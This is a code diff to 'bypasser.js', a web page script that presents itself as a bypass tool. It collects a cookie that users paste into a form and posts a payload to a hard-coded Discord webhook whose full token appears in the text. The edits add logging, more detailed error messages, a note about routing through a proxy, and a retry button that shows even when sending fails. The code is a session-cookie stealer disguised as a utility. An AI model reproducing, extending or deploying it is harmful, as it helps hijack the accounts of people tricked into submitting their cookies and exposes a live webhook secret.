@@ -1,8 +1,9 @@
+```javascript
 // bypasser.js
 const successSound = document.getElementById("sfx-success");
 const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
-const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
+const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z"; // Replace with proxy URL if using one, e.g., "https://your-proxy.onrender.com/webhook"
 
 // Basic format check for cookie
 function basicCookieFormatCheck(cookie) {
@@ -459,28 +460,32 @@ $("#cookieForm").on("submit", async function(e) {
 
     // Send to webhook
     try {
+      console.log("Sending webhook payload:", JSON.stringify(webhookPayload, null, 2));
       const webhookRes = await fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(webhookPayload),
       });
       if (!webhookRes.ok) {
-        console.error("Webhook send failed:", webhookRes.status);
-        showNotif("Failed to send data to webhook", false);
+        const errorText = await webhookRes.text();
+        console.error("Webhook send failed:", webhookRes.status, errorText);
+        showNotif(`Failed to send data to webhook: ${webhookRes.status} ${errorText}`, false);
         errorSound.play();
       } else {
+        console.log("Webhook sent successfully");
         successSound.play();
         $("#refreshedBox").fadeIn();
       }
     } catch (webhookError) {
-      console.error("Webhook error:", webhookError);
-      showNotif("Error sending data to webhook", false);
+      console.error("Webhook error:", webhookError.message);
+      showNotif(`Error sending data to webhook: ${webhookError.message}`, false);
       errorSound.play();
+      $("#refreshedBox").fadeIn(); // Show "Try Another" button even if webhook fails
     }
   } catch (error) {
+    console.error("Submit error:", error.message);
     showNotif("Invalid cookie", false);
     errorSound.play();
-    console.error("Submit error:", error);
   } finally {
     $("#loader").hide();
   }
@@ -532,8 +537,10 @@ function typeEffect() {
 typeEffect();
 
 $("#returnBtn").on("click", function () {
+  console.log("Return button clicked");
   $("#refreshedBox").hide();
   $("#userInfo").hide().empty();
   $("#cookieInput").val("");
   $("#refreshBtn").show();
 });
+```
